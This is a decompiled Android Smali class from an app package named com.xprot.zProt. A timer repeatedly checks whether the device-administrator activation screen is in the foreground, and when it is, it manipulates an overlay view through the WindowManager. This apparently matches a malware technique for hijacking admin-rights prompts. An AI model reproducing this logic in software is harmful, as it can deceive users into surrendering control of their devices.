.class Lcom/xprot/zProt$Helper$1$1$1$1;
.super Landroid/os/CountDownTimer;
.source "zProt.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/xprot/zProt$Helper$1$1$1;->onClick(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$4:Lcom/xprot/zProt$Helper$1$1$1;


# direct methods
.method constructor <init>(Lcom/xprot/zProt$Helper$1$1$1;JJ)V
    .locals 0
    .param p2, "$anonymous0"    # J
    .param p4, "$anonymous1"    # J

    .prologue
    .line 1
    iput-object p1, p0, Lcom/xprot/zProt$Helper$1$1$1$1;->this$4:Lcom/xprot/zProt$Helper$1$1$1;

    .line 283
    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 6

    .prologue
    .line 288
    iget-object v3, p0, Lcom/xprot/zProt$Helper$1$1$1$1;->this$4:Lcom/xprot/zProt$Helper$1$1$1;

    invoke-static {v3}, Lcom/xprot/zProt$Helper$1$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1$1;)Lcom/xprot/zProt$Helper$1$1;

    move-result-object v3

    invoke-static {v3}, Lcom/xprot/zProt$Helper$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1;)Lcom/xprot/zProt$Helper$1;

    move-result-object v3

    invoke-static {v3}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v3

    invoke-static {v3}, Lcom/xprot/zProt$Helper;->access$6(Lcom/xprot/zProt$Helper;)Lcom/xprot/zProt;

    move-result-object v3

    const-string v4, "activity"

    invoke-virtual {v3, v4}, Lcom/xprot/zProt;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/ActivityManager;

    .line 289
    .local v1, "am":Landroid/app/ActivityManager;
    const/4 v3, 0x1

    invoke-virtual {v1, v3}, Landroid/app/ActivityManager;->getRunningTasks(I)Ljava/util/List;

    move-result-object v2

    .line 290
    .local v2, "taskInfo":Ljava/util/List;, "Ljava/util/List<Landroid/app/ActivityManager$RunningTaskInfo;>;"
    const/4 v3, 0x0

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/ActivityManager$RunningTaskInfo;

    iget-object v0, v3, Landroid/app/ActivityManager$RunningTaskInfo;->topActivity:Landroid/content/ComponentName;

    .line 292
    .local v0, "T_Init":Landroid/content/ComponentName;
    invoke-virtual {v0}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    move-result-object v3

    const-string v4, "DeviceAdminAdd"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 294
    iget-object v3, p0, Lcom/xprot/zProt$Helper$1$1$1$1;->this$4:Lcom/xprot/zProt$Helper$1$1$1;

    invoke-static {v3}, Lcom/xprot/zProt$Helper$1$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1$1;)Lcom/xprot/zProt$Helper$1$1;

    move-result-object v3

    invoke-static {v3}, Lcom/xprot/zProt$Helper$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1;)Lcom/xprot/zProt$Helper$1;

    move-result-object v3

    invoke-static {v3}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v3

    iget-object v4, p0, Lcom/xprot/zProt$Helper$1$1$1$1;->this$4:Lcom/xprot/zProt$Helper$1$1$1;

    invoke-static {v4}, Lcom/xprot/zProt$Helper$1$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1$1;)Lcom/xprot/zProt$Helper$1$1;

    move-result-object v4

    invoke-static {v4}, Lcom/xprot/zProt$Helper$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1;)Lcom/xprot/zProt$Helper$1;

    move-result-object v4

    invoke-static {v4}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v4

    iget-object v4, v4, Lcom/xprot/zProt$Helper;->WM:Landroid/view/WindowManager;

    iget-object v5, p0, Lcom/xprot/zProt$Helper$1$1$1$1;->this$4:Lcom/xprot/zProt$Helper$1$1$1;

    invoke-static {v5}, Lcom/xprot/zProt$Helper$1$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1$1;)Lcom/xprot/zProt$Helper$1$1;

    move-result-object v5

    invoke-static {v5}, Lcom/xprot/zProt$Helper$1$1;->access$0(Lcom/xprot/zProt$Helper$1$1;)Lcom/xprot/zProt$Helper$1;

    move-result-object v5

    invoke-static {v5}, Lcom/xprot/zProt$Helper$1;->access$0(Lcom/xprot/zProt$Helper$1;)Lcom/xprot/zProt$Helper;

    move-result-object v5

    iget-object v5, v5, Lcom/xprot/zProt$Helper;->VW:Landroid/view/View;

    invoke-static {v3, v4, v5}, Lcom/xprot/zProt$Helper;->access$4(Lcom/xprot/zProt$Helper;Landroid/view/WindowManager;Landroid/view/View;)V

    .line 297
    :goto_0
    return-void

    .line 295
    :cond_0
    invoke-virtual {p0}, Lcom/xprot/zProt$Helper$1$1$1$1;->start()Landroid/os/CountDownTimer;

    goto :goto_0
.end method

.method public onTick(J)V
    .locals 0
    .param p1, "arg0"    # J

    .prologue
    .line 303
    return-void
.end method
